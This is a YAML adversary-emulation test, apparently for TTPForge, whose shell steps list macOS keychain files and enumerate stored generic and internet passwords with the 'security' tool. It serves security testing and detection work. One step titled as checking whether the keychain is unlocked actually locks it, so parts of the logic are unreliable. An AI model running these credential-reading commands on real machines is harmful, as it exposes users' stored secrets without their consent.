api_version: 2.0
metadata:
  id: 010-keychain-access-without-password
  name: Keychain Access Without Password
  description: Attempt to access macOS Keychain without user password
  category: privilege_escalation
  sub_category: exploitation
  author: TTPForge
  uuid: 550e8400-e29b-41d4-a716-446655440010
  created: 2026-01-30
  updated: 2026-01-30

requirements:
  platforms:
    - os: darwin
  superuser: false

steps:
  - name: Enumerate keychain databases
    type: command
    description: Find keychain files on the system
    inline: |
      find ~/Library/Keychains -type f 2>/dev/null

  - name: List default keychain
    type: command
    description: Show the default keychain location
    inline: |
      security default-keychain 2>/dev/null

  - name: List keychain items
    type: command
    description: Attempt to dump keychain items
    inline: |
      security find-generic-password 2>/dev/null || echo "Keychain access denied or empty"

  - name: Check for unlocked keychain
    type: command
    description: Test if keychain is currently unlocked
    inline: |
      security lock-keychain login.keychain 2>&1 && echo "Keychain was unlocked" || echo "Keychain already locked"

  - name: Enumerate stored credentials
    type: command
    description: Attempt to list all stored credentials
    inline: |
      security find-internet-password 2>/dev/null | grep -E "acct|srvr" || echo "No internet passwords found"

checks:
  - name: Verify user context
    type: command
    inline: whoami && id

  - name: Check keychain lock status
    type: command
    inline: |
      security lock-keychain-status login.keychain 2>/dev/null

tests:
  - name: Detect keychain access opportunities
    type: dry_run
    description: Safely enumerate keychain without attempting decryption
    steps:
      - step: 1
      - step: 2

cleanup:
  - name: Restore keychain state
    type: command
    description: Re-lock keychain if modified
    inline: |
      security lock-keychain login.keychain 2>/dev/null
      echo "Keychain enumeration complete"
